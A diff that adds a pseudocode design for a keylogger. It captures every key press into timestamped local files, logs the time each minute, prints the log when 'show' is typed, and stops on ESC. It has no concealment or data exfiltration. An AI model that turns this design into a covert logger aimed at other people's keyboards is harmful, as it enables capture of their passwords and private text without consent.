@@ -1,0 +1,140 @@
+
+
+PSEUDOCODE: Keylogger System
+
+=============================
+
+
+
+START PROGRAM
+
+
+
+SET current_time_string TO current date and time
+
+SET filename TO 'keys_' + current_time_string + '.txt'
+
+SET last_listen_filename TO 'Last_listen.txt'
+
+SET current_listening_name TO 'listening.txt'
+
+SET current_listening TO empty list
+
+
+
+FUNCTION write_timestamp_every_minute:
+
+    LOOP FOREVER:
+
+        GET current date and time as string
+
+        OPEN filename in append mode:
+
+            WRITE timestamp to file
+
+        WAIT 60 seconds
+
+
+
+FUNCTION handle_show_command:
+
+    IF last_listen_filename EXISTS:
+
+        OPEN it in read mode:
+
+            PRINT its contents
+
+    ELSE:
+
+        OPEN current_listening_name in read mode:
+
+            PRINT its contents
+
+
+
+FUNCTION on_key_press(key):
+
+    TRY:
+
+        GET character from key
+
+    EXCEPT:
+
+        SET text_key TO string representing special key
+
+
+
+    ADD text_key TO current_listening
+
+
+
+    OPEN filename in append mode:
+
+        WRITE text_key
+
+    OPEN current_listening_name in append mode:
+
+        WRITE text_key
+
+
+
+    IF last 4 items in current_listening form the word "show":
+
+        CALL handle_show_command
+
+
+
+    IF key is ESC:
+
+        STOP listener
+
+
+
+FUNCTION start_timer_thread:
+
+    CREATE and START background thread:
+
+        TARGET: write_timestamp_every_minute
+
+
+
+FUNCTION start_keyboard_listener:
+
+    START keyboard listener:
+
+        ON key press → CALL on_key_press(key)
+
+    WAIT for listener to finish
+
+
+
+FUNCTION finalize_files:
+
+    IF last_listen_filename EXISTS:
+
+        DELETE it
+
+    RENAME current_listening_name TO last_listen_filename
+
+
+
+FUNCTION main:
+
+    CALL start_timer_thread
+
+    CALL start_keyboard_listener
+
+    CALL finalize_files
+
+
+
+IF this file is the main file being executed:
+
+    CALL main()
+
+
+
+END PROGRAM
+
+
+
